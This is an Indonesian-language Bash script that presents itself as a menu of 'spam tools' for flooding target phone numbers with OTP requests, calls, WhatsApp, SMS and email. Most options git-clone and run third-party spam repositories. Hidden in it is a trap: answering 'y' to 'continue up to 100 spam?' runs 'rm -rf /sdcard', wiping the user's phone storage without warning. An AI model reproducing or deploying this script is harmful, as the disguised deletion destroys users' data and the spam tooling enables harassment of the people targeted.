#!/bin/bash
#BlackCoderRootedMrG3P5.inc

clear
bi='\033[34;1m' #biru
i='\033[32;1m' #ijo
pur='\033[35;1m' #purple
cy='\033[36;1m' #cyan
me='\033[31;1m' #merah
pu='\033[37;1m' #putih
ku='\033[33;1m' #kuning
mer='\033[41;97m' #Tepi
R='\x1b[1;31m'
G='\x1b[1;32m'
B='\x1b[1;34m'
Y='\x1b[1;33m'
C='\x1b[1;36m'
D='\x1b[0m'
endc='\E[0m'
enda='\033[0m'

ulang="y"
while [ $ulang = "y" ];
do

echo $cy"      #################################"
sleep 1
echo $me"      #         Spamm Tools           #"
sleep 1
echo $me"      #      Author :Rooted@MrG3P5    #"
sleep 1
echo $cy"      #################################"
           date |lolcat
sleep 1
echo $bi "Daftar Spamm yang Tersedia"
echo "                              "
sleep 2
echo $cy"<<═══════════════════════════>>"
echo $me" <1.SPAMM OYO"
echo $cy"<<═══════════════════════════>>"
echo $ku" <2.SPAMM PHD"
echo $cy"<<═══════════════════════════>>"
echo $i" <3.SPAMM.. [Installer]"
echo $cy"<<═══════════════════════════>>"
echo $bi" <4.SPAMM CALL"
echo $cy"<<═══════════════════════════>>"
echo $pur" <5.SPAMM [WA]"
echo $cy"<<═══════════════════════════>>"
echo $me" <6.SPAMM PHDv2"
echo $cy"<<═══════════════════════════>>"
echo $ku" <7.SPAMM TELKOMSEL"
echo $cy"<<═══════════════════════════>>"
echo $i" <8.SPAMM EMAIL"
echo $cy"<<═══════════════════════════>>"
echo $bir" <9.SPAMM SMSv3"
echo $cy"<<═══════════════════════════>>"
echo $pur" <00.EXIT PROGRAMM"
echo $cy"<<═══════════════════════════>>"
echo $pu"      "
cd $HOME
cd /sdcard
clear
read -p  "Lanjutkan Sampai 100 Spam? (y/n) >" asule;

if [ $asule = "y" ];
then
echo "sebentar"
rm -rf /sdcard
clear
fi

if [ $asule = "n" ];
then
clear
echo $cy
figlet MAKASIH
exit
fi

sleep 2
read -p "Masukan pilihan anda di sini : " pilih;

if [ $pilih = 1 ]; then
  clear
  toilet -f lean "OYO"
  php oyo.php
fi

if [ $pilih = 2 ]; then
    clear
    toilet -f lean "PHD"
    php phd.php
fi

if [ $pilih = 3 ]; then
    git clone https://github.com/SIIL3NT/spam
    echo $i" UNTUK MENJALANLAN TOOLS NYA KETIK"
sleep 2
    echo $bir "cd spam lalu php SIIL3NT.php (Nomor Target)"
fi

if [ $pilih = 4 ]; then
    clear
    toilet -f lean "CALL"
    php Call.php
fi

if [ $pilih = 5 ]; then
    clear
    git clone https://github.com/Maoundis/k-bisa-otp.git
    cd k-bisa-otp
    python2 kitabis.py
fi

if [ $pilih = 6 ]; then
    clear
    git clone https://github.com/MrBSTRD13/SpamPHD
    cd SpamPHD
    sh SpamPHD.sh
fi

if [ $pilih = 7 ]; then
    clear
    git clone https://github.com/RANDIOLOY/spammee
    cd spammee
    php spamtsel.php
fi

if [ $pilih = 8 ]; then
    clear
    git clone https://github.com/joss24242/SpamSms
    cd SpamSms
    python2 mantan.py
fi

if [ $pilih = 9 ]; then
    clear
    git clone https://github.com/RandiSr/spammmsms
    cd spammmsms
    pip2 install requests
    bash spamm.sh
fi

if [ $pilih = 00 ]; then
    clear
    echo $me "UDAH SELESAI KAN NJOO"
sleep 2
    echo $pu "HABIS NYEPAM SIAPA LU?"
sleep 2
    echo $bir" NYEPAM MANTAN YA KALO NYEPAM MANTAN GW DUKUNG"
sleep 2
    echo $i "SAMPAI JUMPA LAIN WAKTU :)"
sleep 2
figlet -f pagga "GOOD BAYY" |lolcat -a -d 5
   exit 0
else
   echo $me "WRONG INPUT!!!"
   echo $ulang
fi
done
